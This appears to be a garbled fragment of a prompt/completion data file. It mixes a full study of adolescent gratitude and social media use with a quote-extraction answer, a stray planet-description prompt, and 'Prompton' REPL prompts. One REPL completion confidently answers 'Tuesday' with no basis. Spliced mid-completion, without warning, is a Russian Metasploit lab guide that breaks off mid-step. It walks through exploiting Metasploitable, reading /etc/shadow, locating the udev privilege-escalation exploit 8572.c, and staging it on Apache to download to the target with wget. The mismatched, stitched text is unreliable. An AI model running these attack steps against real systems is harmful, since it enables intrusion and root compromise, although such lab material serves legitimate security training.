\\"Gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use.\\" \\"These results suggest that gratitude may motivate adolescents’ meaningful social media use.\\""},{"prompt":"Describe it named Sarsatin, desert planet terraformed into unearthly gaian world.

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents (for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"\\"Some parents have reported that their children’s social media use has become ‘excessive’\\" - This quote highlights the concern some parents have about their children's social media usage which can be a common theme among parents. \\"Gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use\\" - This quote emphasizes the potential positive impact of gratitude on social media usage, specifically in fostering meaningful connections rather than just increasing overall use. \\"The current study examined U.S. adolescents’ gratitude and social media experiences across a 15-month period leading up to and during the COVID-19 pandemic\\" - This quote provides context for the study and the timeline in which the data was collected and analyzed in relation to the pandemic. \\"Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media\\" - This quote highlights the importance of considering the varied experiences adolescents have online and the need for nuanced research in this area. \\"Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use\\" - This quote summarizes one of the key findings of the study, emphasizing the importance of meaningful social media use in relation to gratitude."},{"prompt":"# You are the REPL for a custom programming language called Prompton, it functions exactly like Python, except for an addtional built-in function called \`prompt\`. # \`prompt\` takes a string and interprets it as a GPT prompt, returning the result of the expression contained within. # As an example, \`prompt(\\"What are the first 3 decimals of pi?\\")\`, should return \`149\` result = prompt('What day is it today?') print(result) print(result)","completion":"Tuesday Tuesday"},{"prompt":"# You are the REPL for a custom programming language called Prompton, it functions exactly like Python, except for an addtional built-in function called \`prompt\`. # \`prompt\` takes a string and interprets it as a GPT prompt, returning the result of the expression contained within. # As an example, \`prompt(\\"What are the first 3 decimals of pi?\\")\`, should return \`149\` result = prompt('What day is it today?')","completion":"I'm sorry, but I don't have access to an external GPT service to interpret prompts.

Выполнение работ с Metasploit 15. Запустить Metasploit Metasploit можно также открыть совершив следующие действия (выполнять необязательно, т.к. это просто второй вариант выполнения задачи): Не закрывая терминал в Kali Linux откройте дополнительный терминал и запустите в нём Metasploit framework Metasploit использует PostgreSQL как его базу данных, следовательно сначала её нужно запустить: sudo service postgresql start Вы можете убедиться, работает ли PostgreSQL проверив вывод ss -ant и убедившись, что порт 5432 прослушивается. С запущенной PostgreSQL, следующее, что нам нужно, это запустить службу metasploit. В первый раз, когда запущена служба, она создаст базу данных msf3 user и базу данных называемую msf3. Служба также запустит Metasploit RPC и веб-сервер, который ей требуется: sudo service metasploit start Сейчас, когда службы PostgreSQL и Metasploit запущены, вы можете запустить msfconsole и проверить работу базы данных командой db_status как показано ниже: sudo msfconsole 16. Ознакомиться с информационным ресурсом https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/ В случае ошибок при выполнении Л/р в первую очередь обратитесь к содержимому данного ресурса. 17. С браузера на основной машине запустите ip-адрес Metasploitable (например, information disclosure http://192.168.56.103/phpinfo) и изучить содержимое. 18. Создадим флаг на Metasploitable для того, чтобы затем «украсть» его из системы touch flag 19. Запишем туда secret* (взамен «secret» может быть сохранена конфиденциальная информация, персональные данные, ключи шифрования, логины и иные данные) echo ‘secret’ > flag * Вместо «secret» вам необходимо указать следующую информацию: Заглавные буквы ФИО исполнителя(ей) Л/р, дата выполнения Л/р, номер компьютера, за которым была выполнена Л/р (если Л/р выполнена на личном ПК, указать значение «0») Проведите проверку полученных результатов (в нашем случае в флаг был занесён «secret». 20.

Выбрать эксплойт и ввести адрес уязвимой машины Фактически данным и последующими шагами мы определяем откуда, что и куда отправить (загрузить уязвимость на атакуемую машину) 23. Выбрать payload 24. Указать адрес Kali linux 25. Запустить инфо Обратите внимание на то, что мы и есть «демон». С этого момента для системы мы выступаем от имени системной службы, работающей в фоновом режиме. 26. Запускаем exploit и проверяем, кто мы на уязвимой системе 27. Проверьте имеем ли мы root доступ попробовав получить доступ к файлу /etc/shadow, который доступен для чтения только пользователю root и предназначен для хранения зашифрованных паролей. 28. Просмотрите какие в системе есть шеллы. cat /etc/shells Файл shells содержит список регистрируемых оболочек в системе. Приложения используют этот файл для определения правильных оболочек. Для каждой оболочки должна быть одна строка, содержащая полный путь к оболочке относительно корня. Оболочка ОС – это интерпретатор команд ОС, обеспечивающий интерфейс для взаимодействия пользователя с функциями системы. Командный интерпретатор исполняет команды своего языка, заданные в командной строке или поступающие из стандартного ввода или указанного файла. В UNIX системах распространены языки командных интерпретаторов bash, sh и ksh, а также альтернативные оболочки zsh, csh и tcsh. 29. Посмотрите доступные компиляторы для определения на каком языке необходимо запускать эксплойт. which gcc ls -l /usr/bin/ | grep -E -i -w 'gcc|clang' 30. Посмотрите утилиты, которые можно будет использовать для закачки эксплойта на атакуемую машину which wget /usr/bin/wget 31. Рассмотрим все процессы, запущенные в системе: ps aux Ключ «а» используется для отображения всех процессов, «х» — для отображения процессов, отсоединенных от терминала, а ключ «u» обеспечивает фильтрование по имени или идентификатору пользователя, который запустил программу. По этому списку можно смотреть доступные эксплойты для этих сервисов, но мы заранее знаем, что это udev IV. Базовая реализация атаки на виртуальную машину Metasploitable 32. В новом терминале Kali Linux выполните поиск эксплойта для udev. (udev – это менеджер устройств для новых версий ядра Linux, являющийся преемником devfs, hotplug и HAL. Его основная задача — обслуживание файлов устройств в каталоге /dev и обработка всех действий, выполняемых в пространстве пользователя при добавлении/отключении внешних устройств, включая загрузку firmware.) Вернитесь обратно в Metasploit framework нажав Ctrl+c и подтвердив «y» Найдите эксплойт командой: searchsploit udev Нам интересен local privilege Escalation(2) — /exploits/linux/local/8572.c Обратите внимание на запись пути к эксплойту. В дальнейшем мы будем использовать этот путь для написания команды отправки эксплойта не веб-сервер. 33. Загрузите информацию о эксплойте и изучите как его использовать: … 34. В новом окне терминала запускаем apache2 для того, чтобы загрузить на его веб-сервер эксплойт (а затем скачать на атакуемую виртуальную машину) 35. Скопируем эксплойт в публичную директорию Apache sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html/kali.c Особое внимание уделите правильной расстановке пробелов в команде по примеру, приведенному ниже! 36. Скопируем эксплойт на уязвимую виртуальную машину (обратите внимание – для выполнения команды необходимо 